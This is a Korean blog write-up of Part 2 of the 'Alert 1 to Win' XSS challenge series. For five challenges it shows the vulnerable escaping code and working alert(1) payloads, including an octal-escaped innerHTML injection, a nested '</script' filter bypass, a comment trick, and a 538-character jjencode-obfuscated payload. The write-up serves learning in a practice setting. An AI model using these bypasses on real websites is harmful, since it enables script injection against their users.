---
layout: post
title: "XSS Challenges writeup - Alert 1 to win (Part 2)"
description: XSS Challenges writeup - Alert 1 to win (Part 2)
headline: XSS Challenges writeup - Alert 1 to win (Part 2)
modified: 2017-04-16
category: web xss
comments: true
featured: true
---


Alert 1 to Win Part 2 시작합니다.

# Temlplate
```javascript
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```
입력의 `<, >, &` 과 모든 문자열이 htmlEscape로 치환당합니다. 나머지로 쓸 수 있는건 `/`, `\`이 남았습니다.

그리고 하나더 알아야하는것이 innerHTML의 문자열 처리입니다. 
innerHTML은 Hex값과 Octal 값을 원본 문자열로 소화합니다.

```javascript
document.body.innerHTML = "\x3ca\x3ehi</a>";
```
예시 코드를 실행해보면 정상적으로 a 태그가 본문에 삽입되는것을 확인할 수 있습니다.


그리하여 작성된 첫번째 payload : `\x3cimg src=0 onerror=alert(1)\x3e`(34자리)

역시나 순위권에서 밀렸네요 :( 점점 short exploit이 어렵습니다.
우선은 Hex값인 `\x3c`를 Octal 값인 `\74`로 `\x3e`를 `\76`로 치환해봤습니다.

payload : `\74img src=0 onerror=alert(1)\76`(32자리)
32자리로 줄였는데도 많이 기네요

payload : `\74img src onerror=alert(1)\76`(30자리)
30자리로 어느정도 순위권에 들었는데 만족 스럽지 못합니다 :(

innerHTML으로 삽입되는건 onload가 작동하지 않아서 좀 더 줄이기 어렵네요. 자바스크립트를 좀 더 공부해야 봅니다. 30자리로 만족하고 넘어갑니다.

# JSON ][
```javascript
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```
backend 진형의 워게임 문제라면 항상 등장하는 잘못된 치환 방법의 문제입니다.

`</script>` 를 치환하면 `</script>`를 만들지 못하겠지!? 라는 착각을 일으키지만 `</scr</scriptipt>`를 넣으면 `</script>`로 치환되버리는것을 이용해서 풀면됩니다.

payload : `</sc</scriptript><script>alert(1)//`(35자리)

# Callback ][
```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
Part 1에서 보았던 문제랑 유사한 유형입니다. 대신 `//` 주석을 사용할 수 없는 상황이 되었습니다.

하지만, 자바스크립트 진영에서는 `<!-- -->` 주석도 사용 가능합니다.
자세한 내용은 http://www.javascripter.net/faq/comments.htm 에서 확인해보세요!

payload : `'#';alert(1)<!--`(16자리)

# Skandia ][
part 1의 Skandia 문제와 동일합니다. 하지만 `<>`를 사용할 수 없습니다. 따라서 `<script>`를 집어넣는게 어려워졌습니다.
하지만 더블쿼터(")나 슬래시(/)에 대한 치환이 없습니다.

```
<script>console.log("");ALERT(1)//")</script>
```
따라서 upcase 되어도 문자열은 삽입이 가능합니다.
자바스크립트 난독화 기법중에 알파벳을 이용하지 않는 난독화 기법이 있습니다. 
자세한 설명은 [자바스크립트 난독화 기법 및 분석 방법론](http://codeengn.com/archive/Web Application/자바스크립트 난독화 기법 및 분석 방법론 [박민건].pdf)를 확인해보세요.

payload(538글자) : 
```
");$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.__$+")"+"\"")())();//
```
저는 공개된 [jjencode](http://utf-8.jp/public/jjencode.html)를 사용해서 해결했습니다.
공개된 도구를 사용하지 않으면 충분히 짧은 payload를 짤수 있을것 같지만 538글자로 만족하고 넘어갑니다. 참고로 84글자가 1등입니다.

# iframe
```javascript
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // https://4i.am/?...raw=... just outputs whatever you pass in.
  //
  // Alerting from 4i.am won't count.

  s = '<script>' + s + '<\/script>';
  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.setAttribute('onload', 'youWon && alert(1)');
  return tag.outerHTML;
}
```
우선 아무 입력값을 넣고 생성되는 iframe을 살펴보자

```HTML
<iframe src="https://4i.am/?:XSS=0&CT=text/html&raw=<script>aa</script>" onload="youWon && alert(1)"></iframe>
```

iframe이 삽입되는 문서에 youWon 이라는 변수가 생겨야 alert(1)가 실행된다.

```HTML
<html>
<body>
<iframe name="a">
</iframe>
<body>
<script>
console.log(a)
</script>
```
우선 위의 코드를 실행해보자. 어떤일이 벌어지는가? iframe에 직접 접근이 가능하다. HTML Tag중 name을 지정하면 전역으로 설정되는 tag들이 있다. 자세한건 표준을 살펴보시라! ㅌㅌ

```
1.html:
<iframe name="tim" href="2.html"></iframe>

2.html:
<script type="text/javascript">
    alert(window.name); // tim
</script>
```

그리고 iframe 내부에서는 iframe의 name에 접근이 가능하다. 따라서 iframe 내부에서 iframe의 name을 지정하면 name이 전역변수가 되기에 youWon이라는 변수를 만들 수 있게된다.

payload : `window.name="youWon"`(20자리)

payload : `name="youWon"` (13자리)

넘나 문제가 많은것... Part 3로 넘어갑니다.